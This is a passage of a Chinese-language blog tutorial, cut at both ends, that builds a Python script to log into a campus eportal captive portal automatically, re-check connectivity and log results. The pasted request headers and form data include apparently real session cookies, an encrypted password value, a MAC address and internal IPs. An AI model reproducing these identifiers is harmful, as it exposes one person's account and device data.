class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 请求校园网url</span></span><br><span class="line">        response = request.urlopen(get_URL)</span><br><span class="line">        html = response.read()</span><br><span class="line">        <span class="comment"># 获取title元素内容</span></span><br><span class="line">        res = re.findall(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, html.decode(encoding=<span class="string">&quot;GBK&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;res:&#x27;</span>, res)</span><br><span class="line">        title = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;访问&quot;</span>,get_URL,<span class="string">&quot;失败，请检查请求地址！&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = res[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;title:&quot;</span>,title)</span><br></pre></td></tr></table></figure></li></ol></li><li><ol><li>否则的话，就模拟浏览器的行为，给服务器发一个post请求（设置好header和data，示例如下），然后再发一个get请求进行认证。</li></ol></li><li><p>2.1 设置header</p></li></ul><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_3.png" alt="示例图片" style="zoom:50%;" /></p><p>将请求标头（Request Headers）中的内容复制到代码中，注意header中的内容是字典类型的，因此要将其转换为字典类型。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;781&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_SAVEPASSWORD=true; EPORTAL_COOKIE_OPERATORPWD=; EPORTAL_COOKIE_NEWV=true; EPORTAL_COOKIE_PASSWORD=0c8e03e937910c800890ec544b109fce824381097eba5b4e91011f2c3615a959563377abf814d21320f9f0c98a6615cf42b17d3920473acdb51447afc135c59e2e8a69b4136afde0b623a64e56fc0a82f330f70ce253235e999cc858bff65867a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f368ddf0086582; EPORTAL_AUTO_LAND=; EPORTAL_COOKIE_SERVER=%E7%A7%BB%E5%8A%A8; EPORTAL_COOKIE_SERVER_NAME=%E7%A7%BB%E5%8A%A8; EPORTAL_USER_GROUP=Student; EPORTAL_COOKIE_USERNAME=; JSESSIONID=BD9937825302ECA25A22692E95D92CF1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.9.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://10.10.9.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://10.10.9.4/eportal/index.jsp?wlanuserip=10.201.220.90&amp;wlanacname=FSN-XX-Business&amp;ssid=&amp;nasip=10.10.9.1&amp;snmpagentip=&amp;mac=44fa66c84741&amp;t=wireless-v2-plain&amp;url=http://www.msftconnecttest.com/redirect&amp;apmac=&amp;nasid=FSN-XX-Business&amp;vid=3326&amp;port=472&amp;nasportid=AggregatePort%20175.33260000:3326-0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 Edg/131.0.0.0&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>2.2 设置data</li></ul><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_4.png" alt="示例图片" style="zoom:50%;" /></p><p>将请求负载（Payload）中的内容复制到代码中，注意data中的内容是字典类型的，因此要将其转换为字典类型。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;userId&quot;</span>: <span class="string">&#x27;XXXX&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0c937910c800890ec544b109fce824381097eba5b4e91011f2c3615a9595abf814d21320f9f0c98a642b17d3920473acdb51447afc135c59e2e9b413e0b623a64e56fc0a82f330f70ce253235e999cc85a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f3f0086582&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">    <span class="string">&quot;queryString&quot;</span>: <span class="string">&#x27;wlanuserip%3D10.201.220.90%26wlanacname%3DFSN-XX-Business%26ssid%3D%26nasip%3D10.10.9.1%26snmpagentip%3D%26mac%3D44fa66c84741%26t%3Dwireless-v2-plain%26url%3Dhttp%3A%2F%2Fwww.msftconnecttest.com%2Fredirect%26apmac%3D%26nasid%3DFSN-XX-Business%26vid%3D3326%26port%3D472%26nasportid%3DAggregatePort%2520175.33260000%3A3326-0&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;passwordEncrypt&quot;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;operatorPwd&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;operatorUserId&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;validcode&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;service&quot;</span>: <span class="string">&#x27;%E7%A7%BB%E5%8A%A8&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ol><li>发post请求和get请求，并打印状态码（状态码为200则为成功）</li></ol></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送post请求（设置好header和data）</span></span><br><span class="line">post_response = requests.post(post_URL, data, headers=header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;post请求状态码 <span class="subst">&#123;post_response.status_code&#125;</span>&quot;</span>)  <span class="comment"># 修正状态码获取方式</span></span><br><span class="line">uft_str = post_response.text.encode(<span class="string">&quot;iso-8859-1&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送get请求（修改响应变量名）</span></span><br><span class="line">schoolWebLoginURL = get_URL</span><br><span class="line">get_status = requests.get(schoolWebLoginURL).status_code</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;get请求状态码 <span class="subst">&#123;get_status&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><ol><li>休眠一段时间，然后进行下一次循环。</li></ol></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每1h左右检测一次是否成功连接</span></span><br><span class="line">rand = random.uniform(<span class="number">0</span>, <span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;休眠&quot;</span>,<span class="built_in">int</span>(<span class="number">3600.0</span> + rand),<span class="string">&quot;s&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3600.0</span> + rand)</span><br></pre></td></tr></table></figure><p class='p red'>这样我们就有了一个初始功能的脚本代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re    <span class="comment"># 正则表达式，用于匹配字符</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志文件路径</span></span><br><span class="line">log_file_path = <span class="string">&#x27;D:/win11/desktop/auto_connect.log&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个post请求的URL</span></span><br><span class="line">post_URL = <span class="string">&#x27;http://10.10.9.4/eportal/InterFace.do?method=login&#x27;</span></span><br><span class="line"><span class="comment"># 第二个get请求的URL（浏览器可访问的url）</span></span><br><span class="line">get_URL = <span class="string">&#x27;http://10.10.9.4/eportal/success.jsp?userIndex=30313761383634643038313231376666613631393530663863623836663665345f31302e3230312e3232302e39305f3230323430333930313432&amp;keepaliveInterval=0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;自动联网脚本开始运行...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 请求校园网url</span></span><br><span class="line">        response = request.urlopen(get_URL)</span><br><span class="line">        html = response.read()</span><br><span class="line">        <span class="comment"># 获取title元素内容</span></span><br><span class="line">        res = re.findall(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, html.decode(encoding=<span class="string">&quot;GBK&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;res:&#x27;</span>, res)</span><br><span class="line">        title = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;访问&quot;</span>,get_URL,<span class="string">&quot;失败，请检查请求地址！&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = res[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;title:&quot;</span>,title)</span><br><span class="line">        <span class="comment"># 根据title元素内容判断是否处于已登录状态</span></span><br><span class="line">        <span class="keyword">if</span> title == <span class="string">&#x27;登录成功&#x27;</span>:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;当前状态为：已登陆成功！&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;当前状态为：未登录！&#x27;</span>)</span><br><span class="line">            <span class="comment"># 设置post的请求头，浏览器点击F12，在Netword中选中post请求，点击Headers、request header面板中查看</span></span><br><span class="line">            header = &#123;</span><br><span class="line">                <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;781&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_SAVEPASSWORD=true; EPORTAL_COOKIE_OPERATORPWD=; EPORTAL_COOKIE_NEWV=true; EPORTAL_COOKIE_PASSWORD=0c8e03e937910c800890ec544b109fce824381097eba5b4e91011f2c3615a959563377abf814d21320f9f0c98a6615cf42b17d3920473acdb51447afc135c59e2e8a69b4136afde0b623a64e56fc0a82f330f70ce253235e999cc858bff65867a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f368ddf0086582; EPORTAL_AUTO_LAND=; EPORTAL_COOKIE_SERVER=%E7%A7%BB%E5%8A%A8; EPORTAL_COOKIE_SERVER_NAME=%E7%A7%BB%E5%8A%A8; EPORTAL_USER_GROUP=Student; EPORTAL_COOKIE_USERNAME=; JSESSIONID=BD9937825302ECA25A22692E95D92CF1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.9.4&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://10.10.9.4&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://10.10.9.4/eportal/index.jsp?wlanuserip=10.201.220.90&amp;wlanacname=FSN-XX-Business&amp;ssid=&amp;nasip=10.10.9.1&amp;snmpagentip=&amp;mac=44fa66c84741&amp;t=wireless-v2-plain&amp;url=http://www.msftconnecttest.com/redirect&amp;apmac=&amp;nasid=FSN-XX-Business&amp;vid=3326&amp;port=472&amp;nasportid=AggregatePort%20175.33260000:3326-0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 Edg/131.0.0.0&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 设置post的请求数据，浏览器点击F12，在Netword中选中post请求，点击payload面板中查看</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;userId&quot;</span>: <span class="string">&#x27;XXXX&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0c937910c800890ec544b109fce824381097eba5b4e91011f2c3615a9595abf814d21320f9f0c98a642b17d3920473acdb51447afc135c59e2e9b413e0b623a64e56fc0a82f330f70ce253235e999cc85a22053c8186fd148a20e0ba3d45ced58808990a864a4f39c72f3f0086582&#x27;</span>,  <span class="comment"># 需要根据自己的情况修改</span></span><br><span class="line">                <span class="string">&quot;queryString&quot;</span>: <span class="string">&#x27;wlanuserip%3D10.201.220.90%26wlanacname%3DFSN-XX-Business%26ssid%3D%26nasip%3D10.10.9.1%26snmpagentip%3D%26mac%3D44fa66c84741%26t%3Dwireless-v2-plain%26url%3Dhttp%3A%2F%2Fwww.msftconnecttest.com%2Fredirect%26apmac%3D%26nasid%3DFSN-XX-Business%26vid%3D3326%26port%3D472%26nasportid%3DAggregatePort%2520175.33260000%3A3326-0&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;passwordEncrypt&quot;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;operatorPwd&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;operatorUserId&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;validcode&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;service&quot;</span>: <span class="string">&#x27;%E7%A7%BB%E5%8A%A8&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 发送post请求（设置好header和data）</span></span><br><span class="line">            post_response = requests.post(post_URL, data, headers=header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;post请求状态码 <span class="subst">&#123;post_response.status_code&#125;</span>&quot;</span>)  <span class="comment"># 修正状态码获取方式</span></span><br><span class="line">            uft_str = post_response.text.encode(<span class="string">&quot;iso-8859-1&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 发送get请求（修改响应变量名）</span></span><br><span class="line">            schoolWebLoginURL = get_URL</span><br><span class="line">            get_status = requests.get(schoolWebLoginURL).status_code</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;get请求状态码 <span class="subst">&#123;get_status&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        error_msg = <span class="built_in">str</span>(e)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_path, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> log_file:</span><br><span class="line">        log_file.write(<span class="string">f&quot;[<span class="subst">&#123;time.ctime()&#125;</span>] 自动联网脚本开始运行\n&quot;</span>)</span><br><span class="line">        log_file.write(<span class="string">f&quot;当前状态: <span class="subst">&#123;<span class="string">&#x27;已登陆成功&#x27;</span> <span class="keyword">if</span> title == <span class="string">&#x27;登录成功&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;未登录&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;post_response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;POST状态码: <span class="subst">&#123;post_response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;get_status&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;GET状态码: <span class="subst">&#123;get_status&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error_msg&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            log_file.write(<span class="string">f&quot;错误信息: <span class="subst">&#123;error_msg&#125;</span>\n&quot;</span>)</span><br><span class="line">        log_file.write(<span class="string">&quot;-&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件大小，如果大于1KB则清空文件</span></span><br><span class="line">    <span class="keyword">if</span> os.path.getsize(log_file_path) &gt; <span class="number">1024</span>:</span><br><span class="line">        <span class="built_in">open</span>(log_file_path, <span class="string">&#x27;w&#x27;</span>).close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每1h左右检测一次是否成功连接</span></span><br><span class="line">    rand = random.uniform(<span class="number">0</span>, <span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;休眠&quot;</span>,<span class="built_in">int</span>(<span class="number">3600.0</span> + rand),<span class="string">&quot;s&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3600.0</span> + rand)</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li><ol><li>检测设备的网络连接状态。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_network_connection</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查网络连接状态&quot;&quot;&quot;</span></span><br><span class="line">    targets = [</span><br><span class="line">        <span class="string">&quot;http://connectivitycheck.gstatic.com/generate_204&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.msftconnecttest.com/connecttest.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://connect.rom.miui.com/generate_204&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    timeout = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> targets:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="keyword">as</span> response:</span><br><span class="line">                <span class="keyword">if</span> response.status == <span class="number">204</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></li></ol></li><li><ol><li>根据网络连接状态来决定是否进行自动化连接。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> check_network_connection():</span><br><span class="line">        auto_login(post_URL, get_URL, log_file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;网络已恢复，自动联网脚本结束运行&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol></li><li><ol><li>再将之前的休眠改动位置，更改时间为1min左右。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> check_network_connection():</span><br><span class="line">        auto_login(post_URL, get_URL, log_file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;网络已恢复，自动联网脚本结束运行&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每1min左右检测一次是否成功连接</span></span><br><span class="line">    rand = random.uniform(<span class="number">0</span>, <span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;休眠&quot;</span>,<span class="built_in">int</span>(<span class="number">60.0</span> + rand),<span class="string">&quot;s&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">60.0</span> + rand)</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><blockquote><p>注：有关参数的设置需要按照上面的步骤结合自己实际的情况进行修改，还不支持直接下载源码使用！！！</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re    <span class="comment"># 正则表达式，用于匹配字符</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_network_connection</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查网络连接状态&quot;&quot;&quot;</span></span><br><span class="line">    targets = [</span><br><span class="line">        <span class="string">&quot;http://connectivitycheck.gstatic.com/generate_204&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.msftconnecttest.com/connecttest.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://connect.rom.miui.com/generate_204&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    timeout = 